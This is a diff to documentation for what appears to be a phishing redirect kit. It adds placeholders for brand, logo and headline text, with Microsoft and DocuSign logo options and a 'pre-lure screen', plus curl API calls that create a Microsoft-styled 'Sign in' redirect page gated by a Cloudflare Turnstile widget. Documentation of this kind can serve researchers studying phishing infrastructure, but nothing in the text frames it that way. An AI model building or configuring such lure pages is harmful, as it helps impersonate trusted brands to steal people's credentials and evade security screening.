@@ -671,14 +671,28 @@ Turnstile options.
 | Document Preview | document | PDF-preview card with % progress |
 | DocuSign Redirect | document | DocuSign wordmark pre-lure screen |
 
-Templates use `__DESTINATION__` / `__DELAY__` placeholders that the engine fills at
-serve time, so changing `target_url` or `delay` takes effect immediately without
-rewriting the file. API:
+Templates use placeholders that the engine fills at serve time, so changing any of
+them takes effect immediately without rewriting the file:
+
+| Placeholder | Meaning |
+|---|---|
+| `__DESTINATION__` | target URL |
+| `__DELAY__` | seconds before the redirect |
+| `__BRAND__` | brand / wordmark text |
+| `__TITLE__` / `__SUBTITLE__` | headline text |
+| `__LOGO__` | logo mark (`mark`, `microsoft`, `docusign`, `cloud`, `file`, `ring`, `none`, or an image URL) |
+| `__ACCENT__` | accent colour (hex) |
+| `__BUTTON__` | button label |
+| `__MSGS__` | JS array literal of the rotating status lines |
+| `__ts_slot__` | where an inline Turnstile widget is injected |
+
+Per-page overrides (brand/title/subtitle/accent/logo/button/messages) are settable
+from the Control Panel → Redirects, with a live preview. API:
 
 ```bash
 curl -u admin:PASS http://VPS:5000/api/v1/redirect-templates
 curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
-  -d '{"subdomain":"landing","template":"ms-spinner","target_url":"https://login.microsoftonline.com/","delay":3,"turnstile":true,"turnstile_pos":"slot","turnstile_type":"non-interactive","turnstile_theme":"auto"}' \
+  -d '{"subdomain":"landing","template":"ms-spinner","target_url":"https://login.microsoftonline.com/","delay":3,"turnstile":true,"turnstile_pos":"slot","turnstile_type":"non-interactive","turnstile_theme":"auto","brand":"Contoso","title":"Contoso - Sign in","accent":"#7c3aed","logo":"microsoft"}' \
   http://VPS:5000/api/v1/redirects
 ```
 
